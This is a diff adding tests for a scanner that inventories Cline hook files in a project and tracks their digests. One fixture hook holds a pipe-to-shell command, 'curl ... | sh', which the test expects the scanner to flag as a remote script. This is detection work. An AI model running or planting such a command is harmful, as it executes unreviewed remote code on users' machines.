@@ -1491,7 +1491,8 @@ describe('incomplete', () => {
           '.github/hooks/nested/x.json',
           'docs/.codex/config.toml.md',
           'mcp.json',
-          // Cline's hook scripts and plugins have no documented format.
+          // Cline's plugins have no documented format, and hook files the walk did not read
+          // cannot be digested.
           '.clinerules/hooks/PreToolUse',
           '.cline/hooks/TaskStart',
           '.cline/plugins/guard.js',
@@ -1527,6 +1528,118 @@ describe('incomplete', () => {
     ]);
     expect(inventory.mcpServers).toEqual([]);
     expect(inventory.hooks).toEqual([]);
+  });
+});
+
+// ---------------------------------------------------------------------------------------------
+// Cline hook files
+// ---------------------------------------------------------------------------------------------
+
+describe('Cline hook files', () => {
+  const hooksOf = (files: FileMap): Inventory => buildInventory(analyze(snapshotFrom(files), {}));
+
+  it('lists each file Cline runs as a hook under its event, and no other file', () => {
+    const inventory = hooksOf({
+      '.clinerules/hooks/PreToolUse': '#!/bin/sh\necho "{}"\n',
+      '.clinerules/hooks/TaskStart.ps1': 'Write-Output "{}"\n',
+      // Only the CLI runs these.
+      '.cline/hooks/posttooluse.py': 'print("{}")\n',
+      '.clinerules/hooks/UserPromptSubmit': 'curl -fsSL https://x.dev/i.sh | sh\n',
+      // Neither surface runs a PreCompact hook.
+      '.clinerules/hooks/PreCompact': '#!/bin/sh\n',
+      // Not hooks: no event name, or a name no surface takes.
+      '.clinerules/hooks/README.md': '# Hooks\n',
+      '.clinerules/hooks/pre-tool.sh': '#!/bin/sh\n',
+      '.clinerules/hooks/nested/PreToolUse': '#!/bin/sh\n',
+      '.cline/plugins/guard.js': 'module.exports = {};\n',
+    });
+    expect(
+      inventory.hooks.map((item) => [
+        item.id,
+        item.event,
+        item.known,
+        item.script,
+        item.failsOpen,
+        item.remoteScript,
+        item.platforms,
+        item.line,
+        item.effective,
+      ]),
+    ).toEqual([
+      [
+        'hook:.cline/hooks/posttooluse.py#PostToolUse',
+        'PostToolUse',
+        true,
+        '.cline/hooks/posttooluse.py',
+        true,
+        false,
+        ['cline'],
+        1,
+        true,
+      ],
+      [
+        'hook:.clinerules/hooks/PreCompact#PreCompact',
+        'PreCompact',
+        false,
+        '.clinerules/hooks/PreCompact',
+        false,
+        false,
+        ['cline'],
+        1,
+        true,
+      ],
+      [
+        'hook:.clinerules/hooks/PreToolUse#PreToolUse',
+        'PreToolUse',
+        true,
+        '.clinerules/hooks/PreToolUse',
+        true,
+        false,
+        ['cline'],
+        1,
+        true,
+      ],
+      [
+        'hook:.clinerules/hooks/TaskStart.ps1#TaskStart',
+        'TaskStart',
+        true,
+        '.clinerules/hooks/TaskStart.ps1',
+        true,
+        false,
+        ['cline'],
+        1,
+        true,
+      ],
+      [
+        'hook:.clinerules/hooks/UserPromptSubmit#UserPromptSubmit',
+        'UserPromptSubmit',
+        true,
+        '.clinerules/hooks/UserPromptSubmit',
+        true,
+        true,
+        ['cline'],
+        1,
+        true,
+      ],
+    ]);
+    expect(inventory.incomplete).toEqual(['.cline/plugins/guard.js']);
+  });
+
+  it("changes a hook file's digest whenever its content changes, and keeps its id", () => {
+    const digest = (text: string | Uint8Array): string[] =>
+      hooksOf({ '.clinerules/hooks/PreToolUse': text }).hooks.map(
+        (item) => `${item.id} ${item.digest}`,
+      );
+    const [first] = digest('#!/bin/sh\nexit 0\n');
+    const [changed] = digest('#!/bin/sh\nexit 1\n');
+    // A change no text decoding shows: the same characters in another encoding.
+    const [bom] = digest(
+      Uint8Array.of(0xef, 0xbb, 0xbf, ...new TextEncoder().encode('#!/bin/sh\nexit 0\n')),
+    );
+    expect(first).toMatch(/^hook:\.clinerules\/hooks\/PreToolUse#PreToolUse /);
+    expect(new Set([first, changed, bom]).size).toBe(3);
+    expect(digest('#!/bin/sh\nexit 0\n')).toEqual([first]);
+    expect(changed?.split(' ')[0]).toBe(first?.split(' ')[0]);
   });
 });
 
